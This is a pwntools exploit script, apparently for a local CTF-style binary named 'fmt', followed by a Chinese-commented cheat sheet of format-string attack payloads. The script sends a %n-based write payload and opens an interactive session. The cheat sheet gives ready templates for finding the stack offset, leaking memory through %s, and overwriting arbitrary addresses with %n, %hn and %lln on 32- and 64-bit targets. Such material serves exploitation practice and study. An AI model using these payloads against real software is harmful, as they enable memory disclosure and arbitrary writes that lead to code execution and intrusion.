from pwn import *

elf = ELF('./fmt')
p = process('./fmt')
context(arch="amd64", log_level="debug")
def debug():
    gdb.attach(p)
    pause()

main = b'%26$p'
canary =b'%27$p'
offset = 10
debug()
pay = 'aaaaaaaaaaaaaaaaaa%8$nbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb%9$n'
p.send(pay)
p.interactive()
'''
#!/usr/bin/python3

# 格式化符号说明
%x 以十六进制打印，只能打印4字节，一般只用于32位
%p 打印目标地址，建议32位和64位都用这个
%s 打印地址内容
%c 打印单个字符
%hhn 写一字节
%hn  写两字节
%n   写四字节
%ln  32位写四字节，64位写八字节
%lln 写八字节

#################### 32位
# 求偏移
pad = "aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p..."

# 泄露目标地址内容，假设偏移为offset
## 目标地址放前面
pad = p32(target_addr)+"%{}$s".format(offset).encode("ISO-8859-1")
## 目标地址放后面
pad = "%{}$s".format(offset+1).encode("ISO-8859-1")+p32(target_addr)

# 改写目标地址内容为value
## 目标地址放前面
pad = p32(target_addr)+"%{}c%{}$n".format(value-4, offset).encode("ISO-8859-1")
## 目标地址放后面，注意ljust补位的字符和offset+idx的位置要对应
pad = "%{}c%{}$n".format(value, offset+3).ljust(4*3, "a").encode("ISO-8859-1")
pad += p32(target_addr)
#################### 

#################### 64位
# 求偏移
pad = "aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p..."

# 泄露目标地址内容，目标地址只能放后面，假设偏移为offset
pad = "%{}$s".format(offset+1).ljust(8, "a").encode("ISO-8859-1")+p64(target_addr)

# 改写目标地址内容为value
## 目标地址只能放后面，注意ljust补位的字符和offset+idx的位置要对应
pad = "%{}c%{}$lln".format(value, offset+3).ljust(8*3, "a").encode("ISO-8859-1")
pad += p64(target_addr)
#################### 
'''